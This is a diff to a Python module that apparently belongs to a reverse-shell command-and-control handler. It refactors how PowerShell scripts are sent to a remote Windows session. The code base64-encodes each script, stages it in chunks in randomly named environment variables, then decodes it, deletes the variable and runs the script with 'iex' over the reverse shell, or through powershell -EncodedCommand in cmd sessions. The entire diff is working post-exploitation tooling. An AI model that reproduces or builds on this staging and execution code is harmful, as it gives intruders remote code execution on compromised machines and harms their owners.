@@ -78,47 +78,70 @@ def _stage_base64_powershell(var: str, chunk: str, idx: int) -> str:
     return f"$env:{var}='{esc}'" if idx == 0 else f"$env:{var}+='{esc}'"
 
 
-def send_powershell_script(handler, client_sock, script, stage_timeout=3.0, shell_kind=None) -> bool:
-    """
-    Execute a PowerShell script on the remote Windows session.
-
-    Small scripts use a single EncodedCommand. Larger scripts are staged in the
-    *interactive* shell (cmd SET or PowerShell $env:) so variables persist, then
-    executed in-process (PowerShell host) or via one child powershell.exe (cmd host).
-    """
-    cmd = handler._win_ps_cmd(script)
-    if cmd:
-        return handler.send_to_revshell(client_sock, cmd)
-
-    info = handler._client_info(client_sock) or {}
-    shell_kind = shell_kind or info.get('win_shell') or detect_windows_shell_kind(handler, client_sock)
+def _cache_shell_kind(handler, client_sock, shell_kind: str):
     with handler.client_lock:
         cached = handler.revshell_clients.get(client_sock)
         if cached is not None:
             cached['win_shell'] = shell_kind
 
-    encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
-    var = f"T{secrets.token_hex(4)}"
-    chunk_size = 3500
-    chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
 
+def _resolve_shell_kind(handler, client_sock, shell_kind=None) -> str:
+    info = handler._client_info(client_sock) or {}
+    shell_kind = shell_kind or info.get('win_shell')
+    if not shell_kind:
+        shell_kind = detect_windows_shell_kind(handler, client_sock)
+        _cache_shell_kind(handler, client_sock, shell_kind)
+    return shell_kind
+
+
+def _stage_encoded_script(handler, client_sock, encoded: str, stage_fn, stage_timeout=3.0) -> str:
+    var = f"T{secrets.token_hex(4)}"
+    chunks = [encoded[i:i + 3500] for i in range(0, len(encoded), 3500)]
     handler._flush_shell(client_sock, timeout=0.3)
-    stage_fn = _stage_base64_powershell if shell_kind == 'powershell' else _stage_base64_cmd
     for idx, chunk in enumerate(chunks):
         if not handler.send_to_revshell(client_sock, stage_fn(var, chunk, idx)):
-            return False
+            return ''
         handler.recv_output(client_sock, timeout=stage_timeout)
+    return var
+
+
+def _run_staged_iex(handler, client_sock, var: str) -> bool:
+    run_line = (
+        f"$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($env:{var}));"
+        f"Remove-Item Env:{var} -EA 0; iex $s"
+    )
+    return handler.send_to_revshell(client_sock, run_line)
+
+
+def send_powershell_script(handler, client_sock, script, stage_timeout=3.0, shell_kind=None) -> bool:
+    """
+    Execute a PowerShell script on the remote Windows session.
+
+    Interactive PowerShell revshells run scripts in-process via iex so marked
+    plugin output returns on the same channel. cmd.exe sessions use
+    powershell -EncodedCommand, with env-var staging when needed.
+    """
+    shell_kind = _resolve_shell_kind(handler, client_sock, shell_kind)
+    encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
 
     if shell_kind == 'powershell':
-        run_line = (
-            f"$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($env:{var}));"
-            f"Remove-Item Env:{var} -EA 0;iex $s"
+        var = _stage_encoded_script(
+            handler, client_sock, encoded, _stage_base64_powershell, stage_timeout,
         )
-        return handler.send_to_revshell(client_sock, run_line)
+        if not var:
+            return False
+        return _run_staged_iex(handler, client_sock, var)
 
+    cmd = handler._win_ps_cmd(script)
+    if cmd:
+        return handler.send_to_revshell(client_sock, cmd)
+
+    var = _stage_encoded_script(handler, client_sock, encoded, _stage_base64_cmd, stage_timeout)
+    if not var:
+        return False
     run_ps = (
         f"$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($env:{var}));"
-        f"Remove-Item Env:{var} -EA 0;iex $s"
+        f"Remove-Item Env:{var} -EA 0; iex $s"
     )
     run_cmd = handler._win_ps_cmd(run_ps)
     if not run_cmd:
